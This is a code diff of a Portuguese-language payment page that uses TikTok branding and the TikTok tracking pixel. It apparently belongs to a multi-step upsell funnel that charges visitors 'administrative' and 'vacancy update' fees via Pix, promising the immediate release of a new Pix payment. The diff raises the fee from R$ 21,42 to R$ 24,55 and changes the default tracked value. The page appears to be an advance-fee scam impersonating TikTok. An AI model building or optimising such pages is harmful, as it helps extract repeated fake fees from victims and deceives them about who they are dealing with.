@@ -16,7 +16,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     p = Object.assign({}, p || {});
     var cid = String(p.content_id || (p.contents && p.contents[0] && p.contents[0].content_id) || 'taxa_confirmacao_tiktok').trim() || 'taxa_confirmacao_tiktok';
     var cname = String(p.content_name || (p.contents && p.contents[0] && p.contents[0].content_name) || 'Taxa de Confirmacao TikTok').trim() || 'Taxa de Confirmacao TikTok';
-    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 13.92);
+    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 36.50);
     p.content_id = cid; p.content_ids = [cid]; p.content_type = 'product'; p.content_name = cname; p.value = val; p.currency = p.currency || 'BRL';
     p.contents = [{ content_id: cid, content_type: 'product', content_name: cname, quantity: 1, price: val }];
     return p;
@@ -174,7 +174,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
                 <div class="bg-black rounded-[2rem] p-8 text-white text-center mb-8 pulse-red border-b-8 border-[#FE2C55]">
                     <span class="text-[11px] uppercase font-black tracking-widest opacity-50">Taxa de Atualização de Vaga</span>
-                    <div class="text-5xl font-black my-3 tracking-tighter">R$ 21,42</div>
+                    <div class="text-5xl font-black my-3 tracking-tighter">R$ 24,55</div>
                     <p class="text-[12px] font-black text-[#FE2C55]">LIBERAÇÃO IMEDIATA DO NOVO PIX</p>
                 </div>
 
@@ -211,7 +211,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     <script src="/checkout/qrcode.min.js"></script>
 <script src="/checkout/up-checkout.js"></script>
 <script>
-function irParaCheckout(event){event.preventDefault();if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){try { ttq.track('InitiateCheckout', { content_id: 'upsell_5_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', contents: [{ content_id: 'upsell_5_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', quantity: 1, price: 21.42 }], value: 21.42, currency: 'BRL' }); } catch(e){}}window.abrirCheckoutPix({valor:21.42,titulo:"Taxa Administrativa",proximoUrl:"../up5/index.html"});}
+function irParaCheckout(event){event.preventDefault();if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){try { ttq.track('InitiateCheckout', { content_id: 'upsell_5_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', contents: [{ content_id: 'upsell_5_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', quantity: 1, price: 24.55 }], value: 24.55, currency: 'BRL' }); } catch(e){}}window.abrirCheckoutPix({valor:24.55,titulo:"Taxa Administrativa",proximoUrl:"../up5/index.html"});}
 </script>
 <script src="../assets/tracking.js"></script>
 <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"3d04d58e8080411197bd269faa9f7da8","r":1,"spa":2}' crossorigin="anonymous"></script>
